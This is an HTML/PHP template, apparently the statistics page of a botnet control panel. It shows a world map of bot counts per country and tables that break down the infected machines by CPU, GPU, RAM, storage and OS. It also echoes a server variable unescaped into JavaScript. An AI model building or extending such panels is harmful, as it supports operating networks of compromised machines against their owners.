<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">			
	
	<div class="row" style="margin-top:10px;">
		<div class="col-md-12">
			<div class="panel panel-default">
				<div class="panel-body tabs">
					<ul class="nav nav-tabs">
						<li class="active"><a href="#tab1" data-toggle="tab">Overview</a></li>
						<li><a href="#tab2" data-toggle="tab">Country</a></li>
						<li><a href="#tab3" data-toggle="tab">CPU</a></li>
						<li><a href="#tab4" data-toggle="tab">GPU</a></li>
						<li><a href="#tab5" data-toggle="tab">RAM</a></li>
						<li><a href="#tab6" data-toggle="tab">Storage</a></li>
						<li><a href="#tab7" data-toggle="tab">OS</a></li>
					</ul>
	
					<div class="tab-content">
						<div class="tab-pane fade in active" id="tab1">
							<h4>World Map</h4>
							  <link rel="stylesheet" href="assets/maps/jquery-jvectormap-2.0.3.css" type="text/css" media="screen"/>
							  <script src="assets/maps/jquery-jvectormap-2.0.3.min.js"></script>
							  <script src="assets/maps/jquery-jvectormap-world-mill.js"></script>

							
							<div id="world-map" style="height: 700px"></div>
							<script>
								$(function(){
									<?php echo "var json_test = jQuery.parseJSON('$country_result');";?>
									<?php echo '
										var botData = {
										  "AF": 16.63,
										  "AL": 11.58,
										  "DZ": 158.97
										};
									';?>
									$('#world-map').vectorMap({
										map: 'world_mill',
										hoverOpacity: 0.7,
										selectedColor: '#666666',
										borderColor: '#585858',
										borderWidth: 0.35,
										borderOpacity: 1,
										series: {
											regions: [{
												values: json_test,
												scale: ['#C8EEFF', '#0071A4'],
												normalizeFunction: 'polynomial'
											}]
										},
										onRegionTipShow: function(e, el, code){
											var amount = 0;
											if(json_test[code]){
												amount = json_test[code];
											}
											el.html(el.html()+' (Bots: '+ amount +')');
										}
									});
								});
							</script>
	
						</div>
						<div class="tab-pane fade" id="tab2">
							<h4>Statistics Per Country</h4>
							<table data-toggle="table" data-url="data/countries" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="country_code" data-sortable="true">Country Code</th>
										<th data-field="country_name" data-sortable="true">Country Name</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>						
						</div>
						<div class="tab-pane fade" id="tab3">
							<h4>Statistics Per CPU</h4>
							<table data-toggle="table" data-url="data/cpu" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="cpu" data-sortable="true">CPU</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>	
						</div>
						<div class="tab-pane fade" id="tab4">
							<h4>Statistics Per GPU</h4>
							<table data-toggle="table" data-url="data/gpu" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="gpu" data-sortable="true">GPU</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>
						</div>
						<div class="tab-pane fade" id="tab5">
							<h4>Statistics Per RAM</h4>
							<table data-toggle="table" data-url="data/ram" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="ram" data-sortable="true">RAM</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>
						</div>
						<div class="tab-pane fade" id="tab6">
							<h4>Statistics Per Storage</h4>
							<table data-toggle="table" data-url="data/storage" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="storage" data-sortable="true">Storage</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>
						</div>
						<div class="tab-pane fade" id="tab7">
							<h4>Statistics Per OS</h4>
							<table data-toggle="table" data-url="data/os" data-show-refresh="true" data-search="true" data-pagination="true" data-sort-name="num" data-sort-order="desc">
								<thead>
									<tr>
										<th data-field="os" data-sortable="true">OS</th>
										<th data-field="num" data-sortable="true">Amount</th>
										<th data-field="per" data-sortable="true">Percentage</th>
									</tr>
								</thead>
							</table>
						</div>
					</div>
				</div>
			</div><!--/.panel-->
		</div><!--/.col-->

	</div><!--/.row-->	
	
</div>	<!--/.main-->